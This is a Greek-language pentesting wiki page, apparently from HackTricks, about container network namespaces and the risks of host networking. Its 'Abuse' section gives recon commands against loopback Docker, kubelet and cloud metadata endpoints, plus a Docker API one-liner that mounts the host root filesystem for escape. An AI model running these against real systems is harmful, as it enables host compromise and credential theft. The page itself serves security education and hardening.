# Χώρος ονομάτων δικτύου

{{#include ../../../../../banners/hacktricks-training.md}}

## Επισκόπηση

Ο χώρος ονομάτων δικτύου απομονώνει πόρους σχετικούς με το δίκτυο, όπως διεπαφές, διευθύνσεις IP, πίνακες δρομολόγησης, κατάσταση ARP/neighbor, κανόνες firewall, sockets και το περιεχόμενο αρχείων όπως `/proc/net`. Γι' αυτό ένας container μπορεί να έχει κάτι που μοιάζει με το δικό του `eth0`, τις δικές του τοπικές διαδρομές και τη δική του συσκευή loopback χωρίς να κατέχει το πραγματικό network stack του host.

Από πλευράς ασφάλειας, αυτό έχει σημασία επειδή η απομόνωση δικτύου αφορά πολύ περισσότερα από το port binding. Ένας ιδιωτικός χώρος ονομάτων δικτύου περιορίζει τι μπορεί το workload να παρατηρήσει ή να επαναδιαμορφώσει άμεσα. Μόλις αυτός ο χώρος ονομάτων μοιραστεί με τον host, ο container μπορεί ξαφνικά να αποκτήσει ορατότητα σε host listeners, host-local services και σημεία ελέγχου του δικτύου που ποτέ δεν προορίζονταν να εκτεθούν στην εφαρμογή.

## Λειτουργία

Ένας νεοδημιουργημένος χώρος ονομάτων δικτύου ξεκινά με ένα κενό ή σχεδόν κενό περιβάλλον δικτύου μέχρι να του προσαρτηθούν διεπαφές. Τα container runtimes στη συνέχεια δημιουργούν ή συνδέουν virtual interfaces, αναθέτουν διευθύνσεις και διαμορφώνουν διαδρομές ώστε το workload να έχει την αναμενόμενη συνδεσιμότητα. Σε bridge-based deployments, αυτό συνήθως σημαίνει ότι ο container βλέπει ένα veth-backed interface συνδεδεμένο σε host bridge. Στο Kubernetes, τα CNI plugins χειρίζονται το αντίστοιχο setup για την δικτύωση των Pod.

Αυτή η αρχιτεκτονική εξηγεί γιατί `--network=host` ή `hostNetwork: true` αποτελεί τόσο δραματική αλλαγή. Αντί να λαμβάνει ένα προετοιμασμένο ιδιωτικό network stack, το workload ενώνεται με το πραγματικό stack του host.

## Εργαστήριο

Μπορείτε να δείτε ένα σχεδόν κενό χώρο ονομάτων δικτύου με:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Και μπορείτε να συγκρίνετε τους normal και host-networked containers με:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Το container που χρησιμοποιεί host networking δεν έχει πλέον τη δική του απομονωμένη άποψη για sockets και διεπαφές. Αυτή η αλλαγή από μόνη της είναι σημαντική πριν καν ρωτήσεις ποιες δυνατότητες έχει η διεργασία.

## Runtime Usage

Το Docker και το Podman συνήθως δημιουργούν ένα ιδιωτικό network namespace για κάθε container εκτός αν ρυθμιστούν διαφορετικά. Το Kubernetes συνήθως δίνει σε κάθε Pod το δικό του network namespace, το οποίο μοιράζονται τα containers μέσα στο Pod αλλά είναι ξεχωριστό από το host. Τα συστήματα Incus/LXC παρέχουν επίσης πλήρη απομόνωση βασισμένη σε network namespaces, συχνά με μεγαλύτερη ποικιλία virtual networking ρυθμίσεων.

Η γενική αρχή είναι ότι το ιδιωτικό networking είναι το προεπιλεγμένο όριο απομόνωσης, ενώ το host networking είναι ρητή επιλογή εξόδου από αυτό το όριο.

## Misconfigurations

Η σημαντικότερη λανθασμένη ρύθμιση είναι απλώς η κοινή χρήση του host network namespace. Αυτό γίνεται μερικές φορές για λόγους απόδοσης, χαμηλού επιπέδου monitoring, ή ευκολίας, αλλά καταργεί ένα από τα καθαρότερα όρια που έχουν τα containers. Οι listeners που είναι τοπικοί για το host γίνονται πιο άμεσα προσβάσιμοι, υπηρεσίες που είναι προσβάσιμες μόνο από localhost ενδέχεται να γίνουν διαθέσιμες, και δυνατότητες όπως `CAP_NET_ADMIN` ή `CAP_NET_RAW` γίνονται πολύ πιο επικίνδυνες επειδή οι ενέργειες που επιτρέπουν εφαρμόζονται πλέον στο ίδιο το δικτυακό περιβάλλον του host.

Ένα άλλο πρόβλημα είναι η υπερβολική παραχώρηση δικαιωμάτων σχετικών με το δίκτυο ακόμη και όταν το network namespace είναι ιδιωτικό. Ένα ιδιωτικό namespace βοηθά, αλλά δεν καθιστά τα raw sockets ή τον προηγμένο έλεγχο δικτύου αβλαβή.

Στο Kubernetes, το `hostNetwork: true` αλλάζει επίσης το πόση εμπιστοσύνη μπορείτε να έχετε στον διαχωρισμό δικτύου σε επίπεδο Pod. Το Kubernetes τεκμηριώνει ότι πολλά network plugins δεν μπορούν να διακρίνουν σωστά την κίνηση Pod με `hostNetwork` για matching με `podSelector` / `namespaceSelector` και επομένως τη θεωρούν ως κανονική κίνηση κόμβου. Από την πλευρά του επιτιθέμενου, αυτό σημαίνει ότι ένα παραβιασμένο workload με `hostNetwork` πρέπει συχνά να θεωρείται ως foothold σε επίπεδο κόμβου παρά ως ένα κανονικό Pod που εξακολουθεί να περιορίζεται από τις ίδιες πολιτικές όπως workloads σε overlay-network.

## Abuse

Σε ασθενώς απομονωμένα περιβάλλοντα, οι επιτιθέμενοι μπορεί να ελέγξουν υπηρεσίες που ακούνε στο host, να φτάσουν σε management endpoints δεσμευμένα μόνο σε loopback, να sniffάρουν ή να παρεμβληθούν στην κίνηση ανάλογα με τις ακριβές δυνατότητες και το περιβάλλον, ή να αναδιαμορφώσουν τη δρομολόγηση και την κατάσταση του firewall εάν υπάρχει `CAP_NET_ADMIN`. Σε ένα cluster, αυτό μπορεί επίσης να διευκολύνει την πλευρική κίνηση και την αναγνώριση του control-plane.

Εάν υποψιάζεστε host networking, ξεκινήστε επιβεβαιώνοντας ότι οι ορατές διεπαφές και οι listeners ανήκουν στο host και όχι σε ένα απομονωμένο container network:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Οι loopback-only υπηρεσίες είναι συχνά η πρώτη ενδιαφέρουσα ανακάλυψη:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Εάν υπάρχουν δικτυακές δυνατότητες, δοκιμάστε αν το workload μπορεί να επιθεωρήσει ή να τροποποιήσει το ορατό stack:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Σε σύγχρονους πυρήνες, το host networking μαζί με `CAP_NET_ADMIN` μπορεί επίσης να αποκαλύψει τη διαδρομή των πακέτων πέρα από απλές αλλαγές του `iptables` / `nftables`. Τα qdiscs και τα φίλτρα του `tc` είναι επίσης namespace-scoped, οπότε σε ένα κοινόχρηστο host network namespace εφαρμόζονται στις host interfaces που μπορεί να δει το container. Εάν το `CAP_BPF` υπάρχει επιπλέον, network-related eBPF programs όπως οι TC and XDP loaders γίνονται επίσης σημαντικοί:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Αυτό είναι σημαντικό επειδή ένας attacker μπορεί να είναι σε θέση να mirror, redirect, shape ή drop την κίνηση στο επίπεδο διεπαφής του host, όχι μόνο να ξαναγράψει κανόνες firewall. Σε ένα private network namespace αυτές οι ενέργειες περιορίζονται στην προβολή του container· σε ένα shared host namespace γίνονται host-impacting.

Σε cluster ή cloud περιβάλλοντα, το host networking επίσης δικαιολογεί γρήγορη local recon των metadata και των control-plane-adjacent services:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Πλήρες Παράδειγμα: Host Networking + Local Runtime / Kubelet Access

Το Host networking δεν παρέχει αυτόματα root στο host, αλλά συχνά εκθέτει υπηρεσίες που σκόπιμα είναι προσβάσιμες μόνο από τον ίδιο τον κόμβο. Αν κάποια από αυτές τις υπηρεσίες είναι αδύναμα προστατευμένη, το Host networking γίνεται άμεσο μονοπάτι privilege-escalation.

Docker API στο localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet στο localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Επιπτώσεις:

- direct host compromise εάν ένα local runtime API εκτεθεί χωρίς κατάλληλη προστασία
- cluster reconnaissance ή lateral movement εάν kubelet ή local agents είναι προσβάσιμοι
- traffic manipulation ή denial of service όταν συνδυάζεται με `CAP_NET_ADMIN`

## Έλεγχοι

Ο στόχος αυτών των ελέγχων είναι να μάθετε εάν η process έχει private network stack, ποιες routes και listeners είναι ορατές, και αν το network view ήδη μοιάζει host-like πριν καν δοκιμάσετε capabilities.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
Σημαντικά σημεία:

- If `/proc/self/ns/net` and `/proc/1/ns/net` already look host-like, the container may be sharing the host network namespace or another non-private namespace.
- `lsns -t net` and `ip netns identify` είναι χρήσιμα όταν το shell είναι ήδη μέσα σε ένα ονομασμένο ή επίμονο namespace και θέλετε να το συσχετίσετε με αντικείμενα `/run/netns` από την πλευρά του host.
- `ss -lntup` είναι ιδιαίτερα χρήσιμο γιατί αποκαλύπτει loopback-only listeners και τοπικά management endpoints.
- Routes, interface names, firewall context, `tc` state, and eBPF attachments γίνονται πολύ πιο σημαντικά αν υπάρχει `CAP_NET_ADMIN`, `CAP_NET_RAW`, ή `CAP_BPF`.
- Στο Kubernetes, failed service-name resolution από ένα `hostNetwork` Pod μπορεί απλώς να σημαίνει ότι το Pod δεν χρησιμοποιεί `dnsPolicy: ClusterFirstWithHostNet`, και όχι ότι η υπηρεσία λείπει.

Κατά την ανασκόπηση ενός container, αξιολογήστε πάντα το network namespace μαζί με το σύνολο των capabilities. Το host networking μαζί με ισχυρές network capabilities αποτελεί πολύ διαφορετική κατάσταση σε σχέση με το bridge networking μαζί με ένα στενό προεπιλεγμένο σύνολο capabilities.

## Αναφορές

- [Kubernetes NetworkPolicy and `hostNetwork` caveats](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [eBPF token and capability requirements for network-related eBPF programs](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
